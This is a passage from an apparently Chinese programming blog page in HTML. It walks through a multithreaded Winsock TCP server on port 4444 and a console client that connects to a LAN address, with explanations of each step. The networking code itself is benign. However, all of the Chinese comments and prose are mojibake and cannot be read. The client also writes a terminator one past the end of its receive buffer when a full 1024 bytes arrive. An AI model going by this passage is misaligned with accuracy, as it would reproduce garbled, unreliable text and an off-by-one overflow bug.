class="built_in">lock</span>(mtx);</span><br><span class="line">            std::cout &lt;&lt; <span class="string">&quot;Client &quot;</span> &lt;&lt; <span class="built_in">inet_ntoa</span>(clientAddr.sin_addr) &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; <span class="built_in">ntohs</span>(clientAddr.sin_port)</span><br><span class="line">                      &lt;&lt; <span class="string">&quot; disconnected.\n&quot;</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// ä»å®¹å™¨ä¸­ç§»é™¤æ–­å¼€è¿æ¥çš„å®¢æˆ·ç«¯ä¿¡æ¯</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span> it = connectedClients.<span class="built_in">begin</span>(); it != connectedClients.<span class="built_in">end</span>(); ++it) &#123;</span><br><span class="line">                <span class="keyword">if</span> (it-&gt;ip == <span class="built_in">inet_ntoa</span>(clientAddr.sin_addr) &amp;&amp; it-&gt;port == <span class="built_in">ntohs</span>(clientAddr.sin_port)) &#123;</span><br><span class="line">                    connectedClients.<span class="built_in">erase</span>(it);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (bytesReceived &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å…³é—­å¥—æ¥å­—</span></span><br><span class="line">    <span class="built_in">closesocket</span>(clientSocket);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// åˆå§‹åŒ–Winsock</span></span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData) != <span class="number">0</span>) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Failed to initialize Winsock.\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// åˆ›å»ºä¸€ä¸ªå¥—æ¥å­—ï¼ˆsocketï¼‰ï¼Œç”¨äºå»ºç«‹ç½‘ç»œè¿æ¥</span></span><br><span class="line">    SOCKET serverSocket = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (serverSocket == INVALID_SOCKET) &#123;</span><br><span class="line">        <span class="comment">// å¦‚æœåˆ›å»ºå¥—æ¥å­—å¤±è´¥ï¼Œè¾“å‡ºé”™è¯¯ä¿¡æ¯ï¼Œæ¸…ç†Winsockå¹¶è¿”å›é”™è¯¯ç 1</span></span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Failed to create socket.\n&quot;</span>;</span><br><span class="line">        <span class="built_in">WSACleanup</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¾ç½®æœåŠ¡å™¨åœ°å€ä¿¡æ¯</span></span><br><span class="line">    sockaddr_in serverAddr;						   <span class="comment">// å®šä¹‰ä¸€ä¸ª sockaddr_in ç»“æ„ä½“ç”¨äºå­˜å‚¨æœåŠ¡å™¨åœ°å€ä¿¡æ¯</span></span><br><span class="line">    serverAddr.sin_family = AF_INET;               <span class="comment">// ä½¿ç”¨IPv4åœ°å€</span></span><br><span class="line">    serverAddr.sin_port = <span class="built_in">htons</span>(<span class="number">4444</span>);             <span class="comment">// è®¾ç½®æœåŠ¡å™¨ç›‘å¬çš„ç«¯å£å·ä¸º4444</span></span><br><span class="line">    serverAddr.sin_addr.s_addr = INADDR_ANY;       <span class="comment">// æœåŠ¡å™¨ç›‘å¬ä»»ä½•å¯ç”¨çš„ç½‘ç»œæ¥å£</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç»‘å®šå¥—æ¥å­—åˆ°æœåŠ¡å™¨åœ°å€</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">bind</span>(serverSocket, (sockaddr*)&amp;serverAddr, <span class="built_in">sizeof</span>(serverAddr)) == SOCKET_ERROR) &#123;</span><br><span class="line">        <span class="comment">// å¦‚æœç»‘å®šå¤±è´¥ï¼Œè¾“å‡ºé”™è¯¯ä¿¡æ¯ï¼Œå…³é—­å¥—æ¥å­—ï¼Œæ¸…ç†Winsockï¼Œå¹¶è¿”å›é”™è¯¯ç 1</span></span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Failed to bind socket.\n&quot;</span>;</span><br><span class="line">        <span class="built_in">closesocket</span>(serverSocket);</span><br><span class="line">        <span class="built_in">WSACleanup</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç›‘å¬å¥—æ¥å­—ï¼Œç­‰å¾…å®¢æˆ·ç«¯è¿æ¥è¯·æ±‚</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">listen</span>(serverSocket, SOMAXCONN) == SOCKET_ERROR) &#123;</span><br><span class="line">        <span class="comment">// å¦‚æœç›‘å¬å¤±è´¥ï¼Œè¾“å‡ºé”™è¯¯ä¿¡æ¯ï¼Œå…³é—­å¥—æ¥å­—ï¼Œæ¸…ç†Winsockï¼Œå¹¶è¿”å›é”™è¯¯ç 1</span></span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Failed to listen on socket.\n&quot;</span>;</span><br><span class="line">        <span class="built_in">closesocket</span>(serverSocket);</span><br><span class="line">        <span class="built_in">WSACleanup</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Server is listening on port 4444...\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="comment">// æ¥å—å®¢æˆ·ç«¯è¿æ¥</span></span><br><span class="line">        SOCKET clientSocket = <span class="built_in">accept</span>(serverSocket, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>);</span><br><span class="line">        <span class="keyword">if</span> (clientSocket == INVALID_SOCKET) &#123;</span><br><span class="line">            std::cerr &lt;&lt; <span class="string">&quot;Failed to accept client connection.\n&quot;</span>;</span><br><span class="line">            <span class="built_in">closesocket</span>(serverSocket);</span><br><span class="line">            <span class="built_in">WSACleanup</span>();</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ›å»ºå­çº¿ç¨‹ä¸ºå®¢æˆ·ç«¯æä¾›æœåŠ¡</span></span><br><span class="line">        std::<span class="built_in">thread</span>(HandleClient, clientSocket).<span class="built_in">detach</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å…³é—­å¥—æ¥å­—å’Œæ¸…ç†Winsock</span></span><br><span class="line">    <span class="built_in">closesocket</span>(serverSocket);</span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ®µä»£ç æ˜¯ä¸€ä¸ªç®€å•çš„åŸºäºWinsockçš„æœåŠ¡å™¨ç¨‹åºï¼Œå®ƒç›‘å¬ç«¯å£4444ï¼Œæ¥å—å®¢æˆ·ç«¯è¿æ¥ï¼Œç„¶åä¸ºæ¯ä¸ªå®¢æˆ·ç«¯åˆ›å»ºä¸€ä¸ªæ–°çš„çº¿ç¨‹æ¥å¤„ç†é€šä¿¡ã€‚ä»¥ä¸‹æ˜¯è¿™æ®µä»£ç çš„ä¸»è¦åŠŸèƒ½å’Œä¸€äº›å€¼å¾—æ³¨æ„çš„åœ°æ–¹ï¼š</p>
<ol>
<li><p><strong>åˆå§‹åŒ–Winsockï¼š</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData) != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™éƒ¨åˆ†ä»£ç ç”¨äºåˆå§‹åŒ–Winsockåº“ï¼Œç¡®ä¿ç½‘ç»œåº“æ­£ç¡®å¯åŠ¨ã€‚</p>
</li>
<li><p><strong>åˆ›å»ºå¥—æ¥å­—å¹¶ç»‘å®šï¼š</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SOCKET serverSocket = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="built_in">bind</span>(serverSocket, (sockaddr*)&amp;serverAddr, <span class="built_in">sizeof</span>(serverAddr));</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="built_in">listen</span>(serverSocket, SOMAXCONN);</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™é‡Œï¼Œåˆ›å»ºäº†ä¸€ä¸ªå¥—æ¥å­—ï¼Œå°†å…¶ç»‘å®šåˆ°ç‰¹å®šåœ°å€å’Œç«¯å£ï¼Œç„¶åå¼€å§‹ç›‘å¬å®¢æˆ·ç«¯çš„è¿æ¥è¯·æ±‚ã€‚</p>
</li>
<li><p><strong>ä¸»å¾ªç¯ï¼š</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="comment">// æ¥å—å®¢æˆ·ç«¯è¿æ¥</span></span><br><span class="line">    SOCKET clientSocket = <span class="built_in">accept</span>(serverSocket, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    std::<span class="built_in">thread</span>(HandleClient, clientSocket).<span class="built_in">detach</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœåŠ¡å™¨åœ¨ä¸€ä¸ªæ— é™å¾ªç¯ä¸­ç­‰å¾…å®¢æˆ·ç«¯è¿æ¥ã€‚æ¯å½“æœ‰æ–°çš„å®¢æˆ·ç«¯è¿æ¥æ—¶ï¼ŒæœåŠ¡å™¨ä¼šä¸ºè¯¥å®¢æˆ·ç«¯åˆ›å»ºä¸€ä¸ªæ–°çš„çº¿ç¨‹ï¼ˆä½¿ç”¨ <code>std::thread</code>ï¼‰å¹¶è°ƒç”¨ <code>HandleClient</code> å‡½æ•°æ¥å¤„ç†ä¸å®¢æˆ·ç«¯çš„é€šä¿¡ã€‚</p>
</li>
<li><p><strong>HandleClientå‡½æ•°ï¼š</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">HandleClient</span><span class="params">(SOCKET clientSocket)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå‡½æ•°è´Ÿè´£å¤„ç†ä¸æ¯ä¸ªå®¢æˆ·ç«¯çš„é€šä¿¡ã€‚å®ƒé¦–å…ˆè·å–å®¢æˆ·ç«¯çš„åœ°å€ä¿¡æ¯ï¼Œç„¶åå°†å®¢æˆ·ç«¯ä¿¡æ¯å­˜å‚¨åˆ° <code>connectedClients</code> å®¹å™¨ä¸­ã€‚æ¥ç€ï¼Œå®ƒè¿›å…¥ä¸€ä¸ªå¾ªç¯ï¼Œä¸æ–­æ¥æ”¶å®¢æˆ·ç«¯çš„æ¶ˆæ¯ï¼Œå¤„ç†æ¶ˆæ¯ï¼Œå¹¶åœ¨å®¢æˆ·ç«¯æ–­å¼€è¿æ¥æ—¶è¿›è¡Œæ¸…ç†ã€‚æ³¨æ„åˆ°è¿™äº›å¯¹ <code>connectedClients</code> å®¹å™¨å’Œè¾“å‡ºåˆ° <code>std::cout</code> çš„æ“ä½œéƒ½è¢«äº’æ–¥é” <code>mtx</code> ä¿æŠ¤ï¼Œä»¥é˜²æ­¢å¤šçº¿ç¨‹è®¿é—®æ—¶çš„ç«äº‰æ¡ä»¶ã€‚</p>
</li>
<li><p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong></p>
<ul>
<li>ä½¿ç”¨äº†äº’æ–¥é” <code>mtx</code> æ¥ä¿æŠ¤å¯¹ <code>connectedClients</code> å®¹å™¨çš„å¹¶å‘è®¿é—®ï¼Œç¡®ä¿æ•°æ®ä¸€è‡´æ€§ã€‚</li>
<li>ä¸ºäº†é¿å…æ­»é”ï¼Œå¯¹ <code>connectedClients</code> å®¹å™¨çš„è®¿é—®è¢«åŒ…è£¹åœ¨å¤§æ‹¬å·ä¸­ï¼Œç¡®ä¿åœ¨ç¦»å¼€å¤§æ‹¬å·æ—¶é”è¢«é‡Šæ”¾ã€‚</li>
<li>ä½¿ç”¨ <code>std::thread(HandleClient, clientSocket).detach();</code> å°†å®¢æˆ·ç«¯å¤„ç†å‡½æ•°åœ¨æ–°çº¿ç¨‹ä¸­è¿è¡Œï¼Œä½†è¿™å¯èƒ½å¯¼è‡´çº¿ç¨‹ä¸èƒ½è¢«é€‚å½“åœ°ç­‰å¾…å’Œç®¡ç†ï¼Œå› æ­¤éœ€è¦å°å¿ƒå¤„ç†çº¿ç¨‹çš„ç”Ÿå‘½å‘¨æœŸã€‚</li>
</ul>
</li>
</ol>
<h5 id="å®¢æˆ·ç«¯çš„ä»£ç task3-client-cpp"><a href="#å®¢æˆ·ç«¯çš„ä»£ç task3-client-cpp" class="headerlink" title="å®¢æˆ·ç«¯çš„ä»£ç task3_client.cpp"></a>å®¢æˆ·ç«¯çš„ä»£ç <code>task3_client.cpp</code></h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// é“¾æ¥åˆ° ws2_32.lib åº“</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°ç”¨äºå°†æ•°æ®å‘é€ç»™æœåŠ¡å™¨</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sendDataToServer</span><span class="params">(SOCKET clientSocket, <span class="type">const</span> std::string&amp; message)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ä½¿ç”¨ send å‡½æ•°å‘é€æ•°æ®åˆ°æœåŠ¡å™¨</span></span><br><span class="line">    <span class="type">int</span> bytesSent = <span class="built_in">send</span>(clientSocket, message.<span class="built_in">c_str</span>(), message.<span class="built_in">size</span>(), <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// æ£€æŸ¥å‘é€æ˜¯å¦æˆåŠŸ</span></span><br><span class="line">    <span class="keyword">if</span> (bytesSent == SOCKET_ERROR) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Failed to send data to server.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°ç”¨äºä»æœåŠ¡å™¨æ¥æ”¶æ•°æ®</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">receiveDataFromServer</span><span class="params">(SOCKET clientSocket)</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">1024</span>];</span><br><span class="line">    <span class="comment">// ä½¿ç”¨ recv å‡½æ•°æ¥æ”¶ä»æœåŠ¡å™¨å‘æ¥çš„æ•°æ®</span></span><br><span class="line">    <span class="type">int</span> bytesRead = <span class="built_in">recv</span>(clientSocket, buffer, <span class="built_in">sizeof</span>(buffer), <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// å¤„ç†æ¥æ”¶åˆ°çš„æ•°æ®</span></span><br><span class="line">    <span class="keyword">if</span> (bytesRead &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        buffer[bytesRead] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Received from server: &quot;</span> &lt;&lt; buffer &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (bytesRead == <span class="number">0</span>) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Server closed the connection.\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Failed to receive data from server.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// åˆå§‹åŒ– Winsock åº“</span></span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData) != <span class="number">0</span>) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Failed to initialize Winsock.\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ›å»ºå¥—æ¥å­—</span></span><br><span class="line">    SOCKET clientSocket = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (clientSocket == INVALID_SOCKET) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Failed to create socket.\n&quot;</span>;</span><br><span class="line">        <span class="built_in">WSACleanup</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¾ç½®æœåŠ¡å™¨åœ°å€å’Œç«¯å£</span></span><br><span class="line">    sockaddr_in serverAddress;</span><br><span class="line">    serverAddress.sin_family = AF_INET;</span><br><span class="line">    serverAddress.sin_port = <span class="built_in">htons</span>(<span class="number">4444</span>);</span><br><span class="line">    serverAddress.sin_addr.s_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;192.168.65.136&quot;</span>);  <span class="comment">// æœåŠ¡å™¨çš„ IP åœ°å€</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¿æ¥åˆ°æœåŠ¡å™¨</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">connect</span>(clientSocket, (<span class="keyword">struct</span> sockaddr*)&amp;serverAddress, <span class="built_in">sizeof</span>(serverAddress)) == SOCKET_ERROR) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Failed to connect to server.\n&quot;</span>;</span><br><span class="line">        <span class="built_in">closesocket</span>(clientSocket);</span><br><span class="line">        <span class="built_in">WSACleanup</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Connected to server.\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    std::string message;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">// ä»å‘½ä»¤è¡Œè¾“å…¥è·å–æ¶ˆæ¯</span></span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Enter message (type &#x27;exit&#x27; to close): &quot;</span>;</span><br><span class="line">        std::<span class="built_in">getline</span>(std::cin, message);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¦‚æœè¾“å…¥ &#x27;exit&#x27;ï¼Œåˆ™é€€å‡ºå¾ªç¯</span></span><br><span class="line">        <span class="keyword">if</span> (message == <span class="string">&quot;exit&quot;</span>) &#123;</span><br><span class="line">            <span class="built_in">sendDataToServer</span>(clientSocket,<span class="string">&quot;&quot;</span>);  <span class="comment">//å‘é€çš„å­—èŠ‚æ•°ä¸º0ï¼Œè§¦å‘serverç«¯çš„disconnect</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// å‘é€æ¶ˆæ¯ç»™æœåŠ¡å™¨</span></span><br><span class="line">        <span class="built_in">sendDataToServer</span>(clientSocket, message);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// æ¥æ”¶æœåŠ¡å™¨çš„å“åº”</span></span><br><span class="line">        <span class="built_in">receiveDataFromServer</span>(clientSocket);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å…³é—­å¥—æ¥å­—</span></span><br><span class="line">    <span class="built_in">closesocket</span>(clientSocket);</span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>ä¸»è¦åŠŸèƒ½å’Œå€¼å¾—æ³¨æ„çš„åœ°æ–¹ï¼š</strong></p>
<p><strong>1. åˆå§‹åŒ– Winsock åº“ï¼š</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData) != <span class="number">0</span>) &#123;</span><br><span class="line">    std::cerr &lt;&lt; <span class="string">&quot;Failed to initialize Winsock.\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™éƒ¨åˆ†ä»£ç ç”¨äºåˆå§‹åŒ– Winsock åº“ï¼Œç¡®ä¿ç½‘ç»œåº“æ­£ç¡®å¯åŠ¨ã€‚</p>
<p><strong>2. åˆ›å»ºå¥—æ¥å­—å¹¶è¿æ¥åˆ°æœåŠ¡å™¨ï¼š</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SOCKET clientSocket = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">sockaddr_in serverAddress;</span><br><span class="line">serverAddress.sin_family = AF_INET;</span><br><span class="line">serverAddress.sin_port = <span class="built_in">htons</span>(<span class="number">4444</span>);</span><br><span class="line">serverAddress.sin_addr.s_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;192.168.65.136&quot;</span>);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">connect</span>(clientSocket, (<span class="keyword">struct</span> sockaddr*)&amp;serverAddress, <span class="built_in">sizeof</span>(serverAddress)) == SOCKET_ERROR) &#123;</span><br><span class="line">    std::cerr &lt;&lt; <span class="string">&quot;Failed to connect to server.\n&quot;</span>;</span><br><span class="line">    <span class="built_in">closesocket</span>(clientSocket);</span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™é‡Œï¼Œå®¢æˆ·ç«¯åˆ›å»ºäº†ä¸€ä¸ªå¥—æ¥å­—å¹¶è¿æ¥åˆ°æŒ‡å®šçš„æœåŠ¡å™¨åœ°å€å’Œç«¯å£ã€‚</p>
<p><strong>3. å‘é€å’Œæ¥æ”¶æ•°æ®ï¼š</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="comment">// ä»å‘½ä»¤è¡Œè¾“å…¥è·å–æ¶ˆæ¯</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// å‘é€æ¶ˆæ¯ç»™æœåŠ¡å™¨</span></span><br><span class="line">    <span class="built_in">sendDataToServer</span>(clientSocket, message);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// æ¥æ”¶æœåŠ¡å™¨çš„å“åº”</span></span><br><span class="line">    <span class="built_in">receiveDataFromServer</span>(clientSocket);</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>

<p>å®¢æˆ·ç«¯é€šè¿‡ <code>sendDataToServer</code> å‡½æ•°å°†ç”¨æˆ·è¾“å…¥çš„æ¶ˆæ¯å‘é€ç»™æœåŠ¡å™¨ï¼Œå¹¶é€šè¿‡ <code>receiveDataFromServer</code> å‡½æ•°æ¥æ”¶æœåŠ¡å™¨çš„å“åº”ã€‚</p>
<p><strong>4. å…³é—­å¥—æ¥å­—å’Œæ¸…ç† Winsockï¼š</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">closesocket</span>(clientSocket);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br></pre></td></tr></table></figure>

<p>åœ¨ç¨‹åºç»“æŸæ—¶ï¼Œå®¢æˆ·ç«¯å…³é—­å¥—æ¥å­—å¹¶æ¸…ç† Winsock èµ„æºã€‚</p>
<p><strong>5. æ³¨æ„äº‹é¡¹ï¼š</strong></p>
<ul>
<li>ä¸æœåŠ¡å™¨ç«¯ä¸€æ ·ï¼Œå®¢æˆ·ç«¯ä¹Ÿä½¿ç”¨äº† Winsock åˆå§‹åŒ–å’Œæ¸…ç†ã€‚</li>
